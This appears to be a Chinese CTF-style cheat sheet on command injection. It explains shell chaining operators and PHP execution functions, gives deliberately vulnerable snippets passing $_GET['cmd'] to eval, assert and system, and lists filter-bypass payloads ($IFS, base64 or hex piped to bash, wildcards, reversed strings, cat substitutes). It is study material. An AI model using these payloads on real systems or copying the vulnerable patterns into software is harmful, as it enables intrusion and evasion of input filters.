#### 【命令拼接符】

##### <<Windows

###### 命令1 || 命令2

&emsp;&emsp;命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。

###### 命令1 | 命令2

&emsp;&emsp;命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。

###### 命令1 && 命令2

&emsp;&emsp;命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。

###### 命令1 & 命令2

&emsp;&emsp;命令 1、2 一起执行，互不影响。

##### <<Linux

###### ;

&emsp;&emsp;命令 1、2 依次执行，互不影响。

###### |

- 管道符，命令1 的结果做为命令2 的输入。
- 同 Windows 。

###### ||、&&、

&emsp;&emsp;同 Windows 。

#### 【函数】

##### <<PHP

###### eval()
	   
&emsp;&emsp;把字符串按照 PHP 代码来执行。

```php
eval(phpinfo()); //可以
eval(phpinfo();); //报错
eval("phpinfo();"); //可以
eval("phpinfo()"); //报错
```

```php
//?cmd=phpinfo(); 分号必须有
<?php
	$cmd = $_GET["cmd"];
	eval($cmd); //类似这种写法，参数需要引号的，编译器会自动在$cmd的替代内容包裹引号
?>
```

###### assert()

&emsp;&emsp;如果是字符串将会被当作 PHP 代码执行。

```php
assert(phpinfo()); //可以
assert(phpinfo();); //报错
assert("phpinfo()"); //可以
assert("phpinfo();"); //可以
```

```php
//?cmd=phpinfo(); 分号可有可无
<?php
	$cmd = $_GET["cmd"];
	assert($cmd);
?>
```

###### preg_replace()

```php
preg_replace($pattern, $replacement, $subject);
```

- 执行一个正则表达式的搜索和替换。

- $pattern 为正则表达式，\$subject 为目标字符串，将匹配到的部分用 \$replacement 替换。

- 当 \$pattern 处出现 "/e" 修正符，\$replacement 会被当作 PHP 代码执行。

```php
//?cmd=phpinfo(); 分号可有可无
<?php
	preg_replace("/test/e", $_GET["cmd"], "jutst test");
?>
```

###### call_user_func()

```php
call_user_func(函数a, xxx)
```

- 调用函数 a ，xxx为 a 的参数。
- 测试只有 assert 可以，eval 不行。

```php
//?cmd=phpinfo(); 分号可有可无
<?php
	call_user_func(assert, $_GET["cmd"]);
?>
```

###### system()、passthru()

&emsp;&emsp;执行操作系统命令，仅当执行成功时输出执行结果。

```php
system/passthru("命令"); //标准写法
system/passthru(命令); //可以，但会抛出错误
(system/passthru)("命令"); //可以，但会抛出错误
(system/passthru)(命令); //可以，但会抛出错误
```

```php
//?cmd=ver 不要在命令两边加引号，否则无法执行
<?php
	$cmd = $_GET["cmd"];
	system/passthru($cmd);
?>
/*特别说明*/
//?cmd=ver&&vol 只输出ver执行结果
//?cmd=ver&vol 只输出ver执行结果
//?cmd=balabala&vol vol不会执行   
```

###### exec()

&emsp;&emsp;执行操作系统命令，但不会输出任何内容。

```php
exec("命令");
```

###### shell_exec()

&emsp;&emsp;执行操作系统命令，返回执行结果，但不会输出，使用 `echo shell_exec("命令");` 即可输出执行结果。

#### 【绕过】

###### NOTICE

- Windows 会把 echo 后的原封不动输出。
- 下面的内容仅针对 Linux 。

##### <<概述

- 一般是正则匹配过滤。
- 通用绕过方式：
  - 引号（单、双均可）
  - 反斜杠
    - / 表示路径，\ 表示转义符，如果后面跟的是不需要转义的字符，则会忽略 \ 。

##### <<过滤空格

&emsp;&emsp;可用 $IFS 替代空格。
&emsp;&emsp;但注意，对于 `echo 12$IFS34 ` ，输出 "12" 而不是 "12 34"，因为系统会认为 \$ 后面的都是变量名，而前面又没定义，所以不会输出任何东西，怎么办呢？

###### 引号绕过
&emsp;&emsp;`echo 12$IFS""34` ，引号会截断变量名。

###### 局部变量法

&emsp;&emsp;`a=34;echo 12$IFS$a`

###### 大括号绕过

&emsp;&emsp;`echo 12${IFS}34` ，限定变量范围。

###### 添加内置变量

&emsp;&emsp;`echo 12$IFS$134`，$1~9、\$@、\$* 都是内置变量，可截断变量名。

###### <>、<绕过

&emsp;&emsp;<> 和 < 可替代空格。

##### <<过滤命令

###### 编码绕过

- base64

  ```bash
  echo 命令|base64  #输出命令进行base64加密后的密文
  echo 加密后的命令|base64 -d|bash  #先解密命令，再输出命令由bash执行的结果
  echo$IFS$1加密后的命令|base64$IFS$1-d|bash  #同时过滤了空格时
  ```

- hex 16进制

  ```bash
  echo 0x加密后的命令|xxd -r -p|bash #先解密命令，再输出命令由bash执行的结果
  或 #16进制编码下l为6c，s为73
  $(printf "\x6c\x73") #输出ls的执行结果
  ```

- oct 8进制

  ```bash
  $(printf ls) #或$(echo ls)，输出ls的执行结果
  #8进制编码下l为154，s为163
  $(printf "\154\163") #输出ls的执行结果
  ```


###### 局部变量绕过

&emsp;&emsp;将命令拆分为多个变量，通过输入变量名的方式绕过。如 `cat flag.txt` ，可拆解为 `a=c;b=a;c=t;d=.txt;e=ag;f=fl;$a$b$c$IFS$f$e$d` 。

###### []、{}绕过

&emsp;&emsp;类似正则匹配，[] 匹配其内一个字符，{} 匹配其内所有字符，如：

```bash
cat f[l,s]ag.txt #或cat f[a-z]ag.txt
#输出：flag{this_1s_f1@9}
cat f{l,s}ag.txt
#输出：
#flag{this_1s_f1@9}
#cat: fsag.txt: 没有那个文件或目录
```

###### 内置变量绕过

&emsp;&emsp;内置变量如上述，`cat flag.txt` 可添加为如 `c\$1a\$2t\$IFS$*flag.txt`。

###### 反斜杠绕过

​		`cat flag.txt`

- 跨行
  
  ```bash
  $ cat \
  > f\
  > lag\
  > .txt
  flag is here!
  ```
  
- 单行：`c\a\t flag.txt`

###### 通配符绕过

​		`cat ????.???` 、`cat /f*`

###### 使用绝对路径加载命令

&emsp;&emsp;`/bin/cat flag.txt`

###### 字符串反序绕过

&emsp;&emsp;反序为 "txt.galf tac" ，配合 rev 命令使其正序。

```bash
txt.galf tac|rev|bash
```

###### 字符串截取绕过

&emsp;&emsp;假设 ls 的执行结果为 flag.txt ，则可构造 `cat $(expr substr $(ls) 1 8)` 。

###### ``、$()绕过

&emsp;&emsp;如果 ls 的结果为 flag.txt，则可 cat \`ls`或 cat $(ls) ，还可 ls|xargs cat 。

&emsp;&emsp;xargs：进行标准输出格式转换。如上述命令，通过管道符获取 ls 命令的标准输出再通过 xargs 命令对标准输出格式化为 cat 命令的参数。

###### 命令代替绕过

cat：

- more

- head、tail

- file -f file：

  ```bash
  file -f flag.txt
  #输出：flag{this_1s_f1@9}: cannot open `flag{this_1s_f1@9}' (No such file or directory)
  ```

- rev

- nl

- awk NR file：效果跟 cat 一样。

- sort

- uniq

- od

- hexdump -b file：8 进制显示文件内容。

- xxd file：16 进制显示文件内容。

ls

- dir

##### <<命令无回显

###### 重定向查看

- tee
- \> 或 >>

##### <<无数字字母

###### 异或绕过

###### 或绕过

###### 取反绕过

###### 自增绕过
